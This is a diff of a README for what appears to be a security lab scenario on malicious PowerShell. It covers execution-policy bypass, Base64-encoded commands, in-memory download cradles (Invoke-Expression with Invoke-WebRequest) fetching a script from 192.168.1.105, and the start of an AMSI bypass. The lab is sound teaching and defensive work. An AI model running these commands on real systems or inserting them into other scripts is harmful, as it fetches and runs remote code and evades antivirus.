@@ -1,23 +1,33 @@
 # Scenario 
 
-This attack falls into the execution phase of Mitre Att&ck and requires initial access to the victim machine via phishing, credential dumping or other methods. This scenario demonstrates the different techniques and tactics attackers use when using powershell maliciously and details the common misconfigurtions that allow these attacks to take place and best practices to secure your network
-from malicious powershell use.
+This attack falls into the execution phase of MITRE ATT&CK and requires initial access to the victim machine via phishing, credential dumping or other methods. This scenario demonstrates the different techniques and tactics attackers use when using PowerShell maliciously and details the common misconfigurations that allow these attacks to take place, and best practices to secure your network
+from malicious PowerShell use.
 
 # Setup
 # Attack Types
-1. **Local Powershell script Execution**
+1. **Local PowerShell script Execution**
    Attacker runs a script that is hosted locally
+   Execution policy is not a security feature and is used by both attackers and regular users. This command bypasses all policy execution restrictions and executes the script supplied with the file command.
+   The script involves downloading a file from the internet in the script, executing it in memory it will then displaying the results without saving the downloaded file to disk. This demonstrates the ability for the attacker to create their own evil scripts and download them from attacker controlled servers where they can be run in memory without being flagged by antivirus techniques on disk
    Proof of concept: `powershell -ExecutionPolicy Bypass -File .\script.ps1`
-   <img width="702" height="389" alt="image" src="https://github.com/user-attachments/assets/970d2cc5-124b-43e6-8074-357a558b6013" />
+   <img width="622" height="182" alt="image" src="https://github.com/user-attachments/assets/ceeb3da4-cb58-47cb-99e7-09c90302ee48" />
+   <img width="622" height="251" alt="image" src="https://github.com/user-attachments/assets/218d315c-1032-4d95-9bdc-3c792cbc81c3" />
 
-2. **Base64 Encoded Command**
+   
+
+
+3. **Base64 Encoded Command**
    Attackers use Base64-encoded PowerShell commands primarily to:
    - Hide what the code is doing
    - Avoid detection by AV/EDR.
    - Bypass restrictions or logging.
    - Execute commands more reliably in remote or automated contexts.
-  Proof of concept: `powershell -ExecutionPolicy Bypass -EncodedCommand VwByAGkAdABlAC0ASABvAHMAdAAgACIAaABlAGwAbABvACwAIABXAG8AcgBsAGQAIQAiAAoA`
-<img width="860" height="54" alt="image" src="https://github.com/user-attachments/assets/081d264b-6284-4d82-a8e4-ea73c19cbd4a" />
+  <img width="959" height="301" alt="image" src="https://github.com/user-attachments/assets/a1534f28-9cc9-4ed6-bf57-172eadd547c6" />
+
+
+   Proof of concept: `$Commands = 'Invoke-WebRequest -Uri "http://192.168.1.105:8080/script.ps1"'`
+   Proof of concept: `powershell.exe -EncodedCommand SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAALQBVAHIAaQAgACIAMQA5ADIALgAxADYAOAAuADEALgAxADAANQA6ADgAMAA4ADAALwBzAGMAcgBpAHAAdAAuAHAAcwAxACIA`
+   
 
 
   From this point the commands will be base64 encoded due to the prolific use in attacks. All commands will be executed in the same manner
@@ -32,9 +42,10 @@ from malicious powershell use.
    Attackers will download scripts using the Invoke_WebRequest expression which is passed to Invoke-Expression which will execute the
    script in memory never writing any files to disk. This allows attackers to run commands and deliver full malware capabilities
    including c2 beacons.
-   Proof of Concept: `$Text = "Invoke-Expression (Invoke-WebRequest -UseBasicParsing 'http://192.168.1.105/script.ps1')"`
-   <img width="851" height="717" alt="image" src="https://github.com/user-attachments/assets/54252204-a5ff-497c-a8e5-662fca9d29ad" />
-5. AMSI Bypass
+   Proof of Concept: `$Text = "Invoke-Expression (Invoke-WebRequest -UseBasicParsing 'http://192.168.1.105:8080/script.ps1')"`
+   <img width="977" height="508" alt="image" src="https://github.com/user-attachments/assets/13cf87f4-275c-4cf3-8cfd-2ff87ae05418" />
+
+6. AMSI Bypass
 
  `[Ref].Assembly`
 
